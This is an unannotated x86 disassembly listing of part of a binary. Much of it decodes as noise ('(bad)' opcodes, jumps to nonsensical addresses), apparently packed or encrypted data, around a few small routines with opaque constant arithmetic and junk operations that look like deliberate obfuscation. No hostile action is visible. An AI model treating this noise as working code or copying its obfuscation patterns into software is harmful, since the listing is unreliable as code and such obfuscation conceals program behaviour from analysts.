  40590f:	rcr    DWORD PTR [eax+0x49],cl
  405912:	push   esp
  405913:	push   edx
  405914:	ja     0x405907
  405916:	mov    ebx,0xe8f6b7f5
  40591b:	pop    esi
  40591c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591d:	lods   eax,DWORD PTR ds:[esi]
  40591e:	push   es
  40591f:	mov    ecx,0xb9f18302
  405924:	push   eax
  405925:	cdq    
  405926:	cmp    eax,0xdd1a2f27
  40592b:	lds    ecx,FWORD PTR [eax-0x8]
  40592e:	lods   al,BYTE PTR ds:[esi]
  40592f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405930:	xchg   cl,dl
  405932:	jge    0x40595a
  405934:	xchg   BYTE PTR [ebx+0x35cd6a76],ch
  40593a:	jno    0x405982
  40593c:	and    bh,bh
  40593e:	call   0x173c1620
  405943:	std    
  405944:	imul   esp,eax,0x92b11d7b
  40594a:	xor    DWORD PTR [edi+0x49],ebp
  40594d:	jg     0x40593d
  40594f:	inc    eax
  405950:	dec    esi
  405951:	loop   0x4059d0
  405953:	je     0x4059a3
  405955:	cs stos DWORD PTR es:[edi],eax
  405957:	sub    al,0xaf
  405959:	fwait
  40595a:	aas    
  40595b:	mov    ss,WORD PTR [ecx]
  40595d:	mov    BYTE PTR [edx-0xc3bafe3],bl
  405963:	push   cs
  405964:	aas    
  405965:	cdq    
  405966:	inc    ebp
  405967:	sub    eax,0xe2cd5090
  40596c:	pop    eax
  40596d:	shl    esi,cl
  40596f:	(bad)  
  405971:	xchg   ebx,eax
  405972:	rol    DWORD PTR [eax],1
  405974:	clc    
  405975:	xor    eax,DWORD PTR [edi+0xe]
  405978:	shr    BYTE PTR [ebx-0x4225e32a],1
  40597e:	sub    bl,ah
  405980:	aam    0xf0
  405982:	mov    ch,0x8b
  405984:	loope  0x405946
  405986:	push   eax
  405987:	add    eax,0x183754ca
  40598c:	dec    ebx
  40598d:	popa   
  40598e:	mov    esi,0xfe7221e1
  405993:	jae    0x4059df
  405995:	xlat   BYTE PTR ds:[ebx]
  405996:	push   esp
  405997:	lods   eax,DWORD PTR ds:[esi]
  405998:	jmp    0x68fa928d
  40599d:	ret    0x1d12
  4059a0:	jp     0x4059a0
  4059a2:	add    al,0xd7
  4059a4:	fidiv  WORD PTR [ecx]
  4059a6:	push   ecx
  4059a7:	out    0xdc,al
  4059a9:	mov    DWORD PTR [ebp-0x23aeb30c],eax
  4059af:	inc    esp
  4059b0:	icebp  
  4059b1:	push   ds
  4059b2:	call   0x5fe7:0x5ffcf643
  4059b9:	popa   
  4059ba:	adc    al,0x1c
  4059bc:	dec    ecx
  4059bd:	aam    0xb5
  4059bf:	data16 adc al,0xef
  4059c2:	pop    esp
  4059c3:	pop    edi
  4059c4:	mov    BYTE PTR [eax+0x20c26670],bl
  4059ca:	arpl   WORD PTR [eax],dx
  4059cc:	into   
  4059cd:	sar    BYTE PTR [esi],cl
  4059cf:	jbe    0x405990
  4059d1:	adc    DWORD PTR [edi-0x7b],ecx
  4059d4:	mov    al,ds:0xca590fda
  4059d9:	imul   edi,edx,0x1ffe0a44
  4059df:	add    al,0x82
  4059e1:	cmp    BYTE PTR ds:0xcd34aaac,ch
  4059e7:	arpl   bx,bx
  4059e9:	in     eax,dx
  4059ea:	jnp    0x4059e4
  4059ec:	xchg   esi,eax
  4059ed:	sbb    ebp,DWORD PTR [ebx+ecx*2]
  4059f0:	outs   dx,BYTE PTR ds:[esi]
  4059f1:	mov    dh,0x28
  4059f3:	inc    ebp
  4059f4:	xor    eax,0x90c8bea8
  4059f9:	ret    
  4059fa:	mov    WORD PTR [edx],ds
  4059fc:	mov    al,0x26
  4059fe:	retf   
  4059ff:	call   0xb0cd0cd1
  405a04:	cmc    
  405a05:	xchg   edi,eax
  405a06:	adc    al,0x5b
  405a08:	sub    cl,dl
  405a0a:	xlat   BYTE PTR ss:[ebx]
  405a0c:	fist   WORD PTR [ebx]
  405a0e:	stos   BYTE PTR es:[edi],al
  405a0f:	mov    ds:0x2b6b47b1,eax
  405a14:	addr16 pop ss
  405a16:	jg     0x405a6a
  405a18:	jl     0x405a00
  405a1a:	cmp    al,0x85
  405a1c:	push   ebp
  405a1d:	outs   dx,BYTE PTR ds:[esi]
  405a1e:	jmp    0x24ca5a1e
  405a23:	retf   
  405a24:	xchg   edx,eax
  405a25:	popa   
  405a26:	ss loope 0x4059f5
  405a29:	out    dx,eax
  405a2a:	or     eax,0x2c0a4a1c
  405a2f:	ja     0x405a74
  405a31:	cmp    bp,WORD PTR [ecx+0x17ae2856]
  405a38:	out    dx,eax
  405a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a3a:	add    al,0x31
  405a3c:	inc    ebx
  405a3d:	push   es
  405a3e:	sub    DWORD PTR [ebx+0x331dae4e],0xffffff94
  405a45:	leave  
  405a46:	and    eax,0x53e901af
  405a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a4c:	pop    eax
  405a4d:	aam    0xd2
  405a4f:	pop    ebx
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x882a624d
  405b88:	jmp    0x7072e061
  405b8d:	jo     0x405b39
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b16
  405b93:	pop    edx
  405b94:	mov    DWORD PTR [ebx-0x35],edi
  405b97:	not    BYTE PTR [si-0x3]
  405b9b:	xor    al,0x0
  405b9d:	ror    DWORD PTR [eax-0x44],1
  405ba0:	xchg   esi,eax
  405ba1:	mov    DWORD PTR [eax],ebx
  405ba3:	and    bh,BYTE PTR ss:[ebx+0x64]
  405ba7:	fsub   DWORD PTR [eax+0x55]
  405baa:	add    eax,0xf2e89242
  405baf:	add    DWORD PTR [edx+0x3a78a88f],esp
  405bb5:	cmp    esi,ebp
  405bb7:	rol    BYTE PTR [ebx-0x261a7567],1
  405bbd:	xchg   ebx,eax
  405bbe:	ds xor al,0x44
  405bc1:	pusha  
  405bc2:	cmp    DWORD PTR [edi-0x3d],ebx
  405bc5:	sub    al,0x29
  405bc7:	jbe    0x405bb5
  405bc9:	ins    DWORD PTR es:[edi],dx
  405bca:	sbb    ecx,DWORD PTR [esi]
  405bcc:	sub    BYTE PTR [edi+0xffc99b7],al
  405bd2:	sbb    dh,BYTE PTR [ebp-0x27]
  405bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bd6:	leave  
  405bd7:	je     0x405c3a
  405bd9:	pop    es
  405bda:	out    0xa8,al
  405bdc:	sub    eax,0xd484deba
  405be1:	jmp    0x9fbf:0x49839aa1
  405be8:	(bad)  
  405be9:	pop    ebx
  405bea:	test   DWORD PTR [ecx-0x27c5a78a],ebp
  405bf0:	mov    al,0x89
  405bf2:	int    0x61
  405bf4:	lods   eax,DWORD PTR ds:[esi]
  405bf5:	cmp    DWORD PTR ds:0xd1ab1854,ebp
  405bfb:	call   0x3fa:0xf53161
  405c02:	xchg   DWORD PTR [eax],esi
  405c04:	jge    0x405c70
  405c06:	or     BYTE PTR [esi],dl
  405c08:	in     eax,dx
  405c09:	scas   al,BYTE PTR es:[edi]
  405c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c0b:	fidiv  DWORD PTR [edi]
  405c0d:	xchg   DWORD PTR [esi-0x13d3d1d9],ebp
  405c13:	mov    DWORD PTR [edi],eax
  405c15:	mov    edx,0x5095ce5f
  405c1a:	push   DWORD PTR [esi-0xc]
  405c1d:	daa    
  405c1e:	add    DWORD PTR [ebp+ecx*8+0x3a],0xe313722f
  405c26:	sub    eax,DWORD PTR [ecx+edi*4+0x38]
  405c2a:	in     al,0xfe
  405c2c:	call   0xcce:0x31c1e886
  405c33:	fild   DWORD PTR [edx-0x495efe28]
  405c39:	stos   DWORD PTR es:[edi],eax
  405c3a:	mov    ebx,cs
  405c3c:	in     eax,0x5a
  405c3e:	push   0xd1df5f0e
  405c43:	cmp    eax,edx
  405c45:	retf   0x6024
  405c48:	mov    ecx,DWORD PTR [edx+0x57]
  405c4b:	popa   
  405c4c:	xor    edi,eax
  405c4e:	add    esp,edi
  405c50:	jle    0x405cb6
  405c52:	inc    edx
  405c53:	xchg   ebx,eax
  405c54:	mov    BYTE PTR [ebx+0x4b1b068a],ch
  405c5a:	inc    esp
  405c5b:	pop    ecx
  405c5c:	sbb    eax,0xfcd4c120
  405c61:	lea    eax,[eax+0x31]
  405c64:	pop    ecx
  405c65:	push   ss
  405c66:	es xchg esi,eax
  405c68:	mov    eax,0x5f6bdbf7
  405c6d:	xchg   ebx,eax
  405c6e:	mov    ecx,ss
  405c70:	ror    ah,1
  405c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c73:	adc    DWORD PTR [ecx-0x4ac5a90d],0xffffffc5
  405c7a:	daa    
  405c7b:	and    BYTE PTR [ebx+0x25],ch
  405c7e:	jmp    0x21552c71
  405c83:	dec    eax
  405c84:	sub    BYTE PTR [edx-0x5af8c665],al
  405c8a:	test   al,0x2c
  405c8c:	fisub  DWORD PTR [eax+0x2eeea774]
  405c92:	jnp    0x405c76
  405c94:	adc    DWORD PTR [edx],edx
  405c96:	lods   eax,DWORD PTR ds:[esi]
  405c97:	jecxz  0x405c20
  405c99:	adc    BYTE PTR [edi-0x20],cl
  405c9c:	mov    WORD PTR [edi+esi*1-0x2638c56c],ds
  405ca3:	out    dx,al
  405ca4:	fsub   DWORD PTR [ecx]
  405ca6:	or     eax,0xe925c1e1
  405cab:	aam    0xa3
  405cad:	daa    
  405cae:	(bad)  
  405caf:	repnz std 
  405cb1:	test   DWORD PTR [edi],edi
  405cb3:	ds sub bh,dl
  405cb6:	inc    ebp
  405cb7:	push   eax
  405cb8:	(bad)  
  405cb9:	(bad)  
  405cba:	lock xchg ebx,eax
  405cbc:	adc    BYTE PTR [ecx],dl
  405cbe:	add    eax,0xe48f83d0
  405cc3:	stc    
  405cc4:	les    esp,FWORD PTR [ebp-0x75]
  405cc7:	movq   QWORD PTR [eax+0x71],mm1
  405ccb:	cmp    ch,BYTE PTR ds:0x52a65fdb
  405cd1:	fwait
  405cd2:	push   ds
  405cd3:	ret    0x8361
  405cd6:	mov    dl,BYTE PTR [ebp-0x27]
  405cd9:	lds    eax,FWORD PTR [eax+0x2a8852de]
  405cdf:	push   edx
  405ce0:	push   eax
  405ce1:	popf   
  405ce2:	leave  
  405ce3:	adc    dl,bl
  405ce5:	jae    0x405cd7
  405ce7:	ja     0x405cb2
  405ce9:	dec    esi
  405cea:	rcl    BYTE PTR [ebx+edi*8+0xd],1
  405cee:	in     al,dx
  405cef:	dec    ebp
  405cf0:	loopne 0x405cce
  405cf2:	sbb    al,0x51
  405cf4:	mov    ds:0x1d5d0603,eax
  405cf9:	jmp    0xc8c68cb7
  405cfe:	fistp  WORD PTR [ecx+0x45]
  405d01:	les    eax,FWORD PTR [ecx-0x74e75d77]
  405d07:	pusha  
  405d08:	retf   
  405d09:	rcr    DWORD PTR [eax],1
  405d0b:	dec    ecx
  405d0c:	in     eax,dx
  405d0d:	xchg   esi,eax
  405d0e:	dec    eax
  405d0f:	jne    0x405d3a
  405d11:	loop   0x405cf9
  405d13:	popa   
  405d14:	dec    esi
  405d15:	xchg   edi,eax
  405d16:	push   0x5b
  405d18:	jle    0x405d21
  405d1a:	xor    BYTE PTR [ecx+0x5c],dl
  405d1d:	xor    al,0x3
  405d1f:	jp     0x405cc6
  405d21:	sub    al,0x9f
  405d23:	in     eax,0xd6
  405d25:	inc    ebp
  405d26:	stc    
  405d27:	and    DWORD PTR [eax-0xd],ebx
  405d2a:	rol    BYTE PTR [ebx],1
  405d2c:	mov    bl,0x5e
  405d2e:	test   eax,0xd306ece3
  405d33:	int    0xf3
  405d35:	in     al,dx
  405d36:	and    eax,0xc06391be
  405d3b:	pop    edx
  405d3c:	lods   eax,DWORD PTR ds:[esi]
  405d3d:	sub    BYTE PTR [esi+0x2f],0x41
  405d41:	xchg   ebp,eax
  405d42:	out    0xc6,al
  405d44:	enter  0x7309,0xae
  405d48:	mov    dl,0x6
  405d4a:	rcl    DWORD PTR [eax],cl
  405d4c:	jmp    DWORD PTR fs:[eax+0x57]
  405d50:	mov    cl,0x23
  405d52:	pop    edx
  405d53:	adc    BYTE PTR [edx],ch
  405d55:	mov    al,BYTE PTR [eax+0x396d4db8]
  405d5b:	mov    ebp,0x23737f4c
  405d60:	mov    al,0xbb
  405d62:	cmp    al,0xf0
  405d64:	pop    ebp
  405d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d66:	rcr    bl,cl
  405d68:	sbb    eax,0x5e9c07bc
  405d6d:	add    DWORD PTR [ecx],esi
  405d6f:	cmp    al,0x3f
  405d71:	jmp    FWORD PTR ds:0xfe1e98a0
  405d77:	mov    cl,bh
  405d79:	jns    0x405db4
  405d7b:	rcr    BYTE PTR [ebp+0x7fd6e05c],1
  405d81:	das    
  405d82:	and    eax,0xf56912b4
  405d87:	or     cl,BYTE PTR [ebp-0x4c]
  405d8a:	shl    BYTE PTR [ebx],1
  405d8c:	loopne 0x405db8
  405d8e:	loope  0x405d90
  405d90:	mov    ecx,0xedc221d8
  405d95:	rol    bh,0x61
  405d98:	or     eax,0xa6418d34
  405d9d:	jp     0x405d2b
  405d9f:	(bad)  
  405da0:	push   esp
  405da1:	pusha  
  405da2:	sbb    dl,BYTE PTR [edi]
  405da4:	pushf  
  405da5:	(bad)  
  405da6:	sti    
  405da7:	pop    edx
  405da8:	test   BYTE PTR [esi-0x2f960f01],0x8e
  405daf:	addr16 push edx
  405db1:	pop    esi
  405db2:	out    dx,al
  405db3:	(bad)  
  405db4:	xor    al,0x1f
  405db6:	ins    BYTE PTR es:[edi],dx
  405db7:	jle    0x405e19
  405db9:	jne    0x405dd6
  405dbb:	pop    esi
  405dbc:	lods   eax,DWORD PTR ds:[esi]
  405dbd:	cld    
  405dbe:	mov    esi,0xda9cc8e9
  405dc3:	imul   esp,DWORD PTR [ebx+0xd],0x56c7a9ed
  405dca:	or     eax,0x788905de
  405dcf:	xchg   ebx,eax
  405dd0:	fdivr  st(6),st
  405dd2:	cmp    BYTE PTR [esi+edi*8],dl
  405dd5:	fmul   DWORD PTR [ebp+0x30]
  405dd8:	scas   al,BYTE PTR es:[edi]
  405dd9:	cmp    DWORD PTR ds:0x79805988,edi
  405ddf:	xor    eax,0xd971374e
  405de4:	ins    BYTE PTR es:[edi],dx
  405de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405de6:	mov    eax,ds:0x646e8893
  405deb:	and    ecx,DWORD PTR [edi-0x3fc47303]
  405df1:	mov    ds:0xc5c21aa8,al
  405df6:	cli    
  405df7:	int3   
  405df8:	sbb    al,0xf0
  405dfa:	mov    DWORD PTR [edx],ebp
  405dfc:	outs   dx,DWORD PTR ds:[esi]
  405dfd:	std    
  405dfe:	daa    
  405dff:	mov    ds:0x20f19bf3,al
  405e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e05:	or     al,0x38
  405e07:	push   ds
  405e08:	or     eax,0xd8fe1d9b
  405e0d:	adc    BYTE PTR [ebx-0x61],bh
  405e10:	lock fs sub edi,ebx
  405e14:	pop    eax
  405e15:	push   esi
  405e16:	pop    edi
  405e17:	sub    edx,DWORD PTR [edx]
  405e19:	es icebp 
  405e1b:	pusha  
  405e1c:	jno    0x405e51
  405e1e:	call   0x7a09:0xd8de7715
  405e25:	mov    esi,0xfbb8f466
  405e2a:	icebp  
  405e2b:	lahf   
  405e2c:	int3   
  405e2d:	rcl    DWORD PTR [esi+0x7ecb988b],1
  405e33:	sahf   
  405e34:	pop    ss
  405e35:	pushf  
  405e36:	ror    BYTE PTR [edx],cl
  405e38:	repnz fistp DWORD PTR [esi-0x4d]
  405e3c:	mov    dl,0x19
  405e3e:	test   al,0xc7
  405e40:	dec    ecx
  405e41:	rcr    DWORD PTR [edi-0x57506d9d],1
  405e47:	cld    
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x92
  405ea8:	cmp    edi,DWORD PTR ds:[edx+0x70703f3e]
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e3b
  405eb4:	addr16 jp 0x405ef3
  405eb7:	stos   BYTE PTR es:[edi],al
  405eb8:	into   
  405eb9:	push   esp
  405eba:	mov    dl,BYTE PTR [esi-0x33b1ea38]
  405ec0:	test   al,0x75
  405ec2:	enter  0x17fd,0xbd
  405ec6:	pop    esi
  405ec7:	pop    edi
  405ec8:	or     bl,cl
  405eca:	mov    edi,0xe386caf
  405ecf:	(bad)  
  405ed0:	das    
  405ed1:	nop    eax
  405ed4:	sub    cl,BYTE PTR [esi+0x31]
  405ed7:	xchg   esi,eax
  405ed8:	div    ah
  405eda:	out    0xe4,eax
  405edc:	dec    ecx
  405edd:	mov    eax,ds:0x7c9c074d
  405ee2:	mov    ds:0xa8f5cbd,eax
  405ee7:	pop    ebp
  405ee8:	mul    ebx
  405eea:	(bad)  
  405eeb:	call   FWORD PTR [esp+edx*4]
  405eee:	jp     0x405f66
  405ef0:	out    0xe6,al
  405ef2:	(bad)  
  405ef3:	stos   BYTE PTR es:[edi],al
  405ef4:	clc    
  405ef5:	ins    BYTE PTR es:[edi],dx
  405ef6:	sub    eax,0x40f50916
  405efb:	retfw  0xd773
  405eff:	fs std 
  405f01:	cwde   
  405f02:	xlat   BYTE PTR ds:[ebx]
  405f03:	push   ebx
  405f04:	push   ecx
  405f05:	addr16 sbb eax,0x5d38fd07
  405f0b:	sbb    edx,DWORD PTR [eax-0x3d]
  405f0e:	in     eax,dx
  405f0f:	(bad)  
  405f11:	jo     0x405f8b
  405f13:	sub    bh,BYTE PTR [ebx]
  405f15:	pop    esi
  405f17:	jmp    0x6ed6:0xd15113fe
  405f1e:	daa    
  405f1f:	sub    cl,cl
  405f21:	mov    eax,0xdd1f0f62
  405f26:	xor    eax,0x47654f9c
  405f2b:	cmp    BYTE PTR [edi-0x4ef4d7f6],cl
  405f31:	ins    BYTE PTR es:[edi],dx
  405f32:	stos   DWORD PTR es:[edi],eax
  405f33:	ja     0x405f3b
  405f35:	pop    DWORD PTR [ebx-0x54047479]
  405f3b:	js     0x405f30
  405f3d:	mov    dl,0x62
  405f3f:	leave  
  405f40:	push   edi
  405f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f42:	mov    ah,0x6c
  405f44:	pop    ebx
  405f45:	jge    0x405f50
  405f47:	mov    dl,0x69
  405f49:	fwait
  405f4a:	mov    ch,0xd5
  405f4c:	std    
  405f4d:	push   ss
  405f4e:	shl    ah,1
  405f50:	out    0x31,al
  405f52:	aad    0xe
  405f54:	loopne 0x405f10
  405f56:	dec    ecx
  405f57:	in     eax,0xd9
  405f59:	jg     0x405fa5
  405f5b:	jmp    0x405f7d
  405f5d:	ficomp DWORD PTR es:[ecx-0x54]
  405f61:	jne    0x405f07
  405f63:	mov    ecx,0x2e27baa6
  405f68:	jb     0x405f60
  405f6a:	xchg   edi,eax
  405f6b:	xchg   edx,eax
  405f6c:	stc    
  405f6d:	inc    ebp
  405f6e:	mov    DWORD PTR [esi+ebx*4],esi
  405f71:	rcl    BYTE PTR [ecx-0x70b7cecb],1
  405f77:	call   FWORD PTR [esi+0x64abe77d]
  405f7d:	mov    edx,0x1159c32e
  405f82:	sbb    BYTE PTR [eax-0x4242f1ec],bh
  405f88:	popa   
  405f89:	jb     0x405fac
  405f8b:	sbb    ebp,DWORD PTR [ebx+eiz*1]
  405f8e:	mov    dh,0xcf
  405f90:	sbb    esp,DWORD PTR [ebx+0x3a]
  405f93:	mov    edi,?
  405f95:	(bad)  
  405f96:	in     al,0xf0
  405f98:	cs cmc 
  405f9a:	inc    esp
  405f9b:	push   eax
  405f9d:	cmp    bl,BYTE PTR [eax+0x1]
  405fa0:	mov    eax,ds:0xf5558390
  405fa5:	loopne 0x405f57
  405fa7:	outs   dx,BYTE PTR ds:[esi]
  405fa8:	xchg   edx,eax
  405fa9:	inc    ebp
  405faa:	xchg   esp,eax
  405fab:	jnp    0x405ff8
  405fad:	jg     0x405fb7
  405faf:	pop    ebx
  405fb0:	dec    ecx
  405fb1:	mov    al,ds:0xf0ab0a78
  405fb6:	dec    eax
  405fb7:	and    ebx,DWORD PTR [esi+0x77ce0c84]
  405fbd:	cmp    DWORD PTR [ebx],esi
  405fbf:	add    al,0xa5
  405fc1:	aas    
  405fc2:	xchg   ebx,eax
  405fc3:	adc    al,0x7
  405fc5:	push   ecx
  405fc6:	push   edx
  405fc7:	cmp    BYTE PTR [edx+0x73],al
  405fca:	xor    eax,0xff319190
  405fcf:	fisubr DWORD PTR [ebx-0x52]
  405fd2:	test   BYTE PTR [ebx+0x37],ch
  405fd5:	sti    
  405fd6:	gs pop es
  405fd8:	pop    ebp
  405fd9:	popa   
  405fda:	mov    ah,BYTE PTR [edx-0x1c]
  405fdd:	cmp    DWORD PTR [edx-0x10],esi
  405fe0:	adc    eax,0x9125b99b
  405fe5:	nop
  405fe6:	fdivr  DWORD PTR [ecx]
  405fe8:	cmp    esi,0x23
  405feb:	mov    BYTE PTR [ebx+0x61af4eb5],ch
  405ff1:	gs int3 
  405ff3:	and    DWORD PTR [esi-0x645c8c0e],0x9a2370e4
  405ffd:	jmp    0x406054
  405fff:	mov    WORD PTR [esi],?
  406001:	imul   bh
  406003:	push   esi
  406004:	and    esp,esi
  406006:	adc    al,0xfb
  406008:	cmp    ebx,esi
  40600a:	test   eax,0xbe809c26
  40600f:	pushf  
  406010:	in     al,dx
  406011:	xlat   BYTE PTR ds:[ebx]
  406012:	std    
  406013:	(bad)  
  406015:	or     BYTE PTR es:[esi-0x61e4f509],bl
  40601c:	retf   
  40601d:	(bad)  
  40601e:	xchg   ecx,eax
  40601f:	sbb    ch,BYTE PTR [ebx+0x7e]
  406022:	ja     0x405fb7
  406024:	sub    esp,edx
  406026:	sub    ecx,DWORD PTR [edx+edi*2+0x70]
  40602a:	push   edi
  40602b:	outs   dx,DWORD PTR ds:[esi]
  40602c:	icebp  
  40602d:	sbb    al,0x8f
  40602f:	xor    ah,BYTE PTR [esi+0x232dcd61]
  406035:	fstp   DWORD PTR [ebp+0x7b019b4e]
  40603b:	mov    WORD PTR [ebx+eiz*4-0x63],?
  40603f:	or     BYTE PTR [esp+edx*4],ah
  406042:	sbb    eax,0x9f1fa128
  406047:	or     BYTE PTR [edx],cl
  406049:	ret    0x66cc
  40604c:	lods   al,BYTE PTR ds:[esi]
  40604d:	xchg   DWORD PTR [edx-0x2f],esp
  406050:	in     al,0xe2
  406052:	(bad)  
  406053:	jo     0x40604d
  406055:	rol    ebp,1
  406057:	jne    0x406008
  406059:	stos   BYTE PTR es:[edi],al
  40605a:	std    
  40605b:	sub    DWORD PTR ds:0x32729c,eax
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x52c11296
  4060dc:	jne    0x406143
  4060de:	ds jo  0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40615c
  4060e6:	jne    0x406094
  4060e8:	inc    esi
  4060e9:	inc    edi
  4060ea:	bound  ebx,QWORD PTR [esi-0x34bc09fe]
  4060f0:	ds inc edx
  4060f2:	lea    esp,[edi]
  4060f4:	pusha  
  4060f5:	pop    es
  4060f6:	mov    ebx,0x9a199fea
  4060fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060fc:	repnz adc eax,0x63d0bd7e
  406102:	pop    esi
  406103:	mov    bh,0x90
  406105:	fidiv  WORD PTR [edi-0x422cd67c]
  40610b:	inc    esi
  40610c:	dec    ecx
  40610d:	jg     0x40610c
  40610f:	imul   ecx,DWORD PTR [ecx+edi*2],0x27
  406113:	sbb    eax,DWORD PTR [edi]
  406115:	adc    al,0xf0
  406117:	(bad)  
  406118:	jl     0x406164
  40611a:	inc    esp
  40611b:	or     edx,DWORD PTR [edx]
  40611d:	call   0xa3c7:0x8ef4e7d9
  406124:	inc    ecx
